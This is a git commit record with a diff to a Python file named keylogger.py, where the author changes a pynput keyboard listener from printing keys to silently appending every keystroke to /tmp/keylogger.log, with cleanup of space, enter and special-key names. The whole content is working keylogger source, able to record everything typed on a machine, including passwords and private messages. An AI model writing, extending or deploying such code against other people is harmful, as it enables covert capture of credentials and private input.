85fada9e1ce69a5491228f551b78b8c28018b096
ubrito <unaldo.brito@gmail.com>
2020-12-31 11:42:10 -0300

    Tratamento de algumas teclas

--- keylogger.py
+++ keylogger.py
@@ -1,7 +1,18 @@
+import re
 from pynput.keyboard import Listener
 
+log = "/tmp/keylogger.log"
+
 def capture(key):
-    print(str(key))
+    key = str(key)
+    key = re.sub(r'\'', '', key)
+    key = re.sub(r'Key.space', ' ', key)
+    key = re.sub(r'Key.enter', '\n', key)
+    key = re.sub(r'Key.*', '', key)
+    #print(key)
+
+    with open(log, "a") as l:
+        l.write(key)
 
 with Listener(on_press=capture) as l:
     l.join()
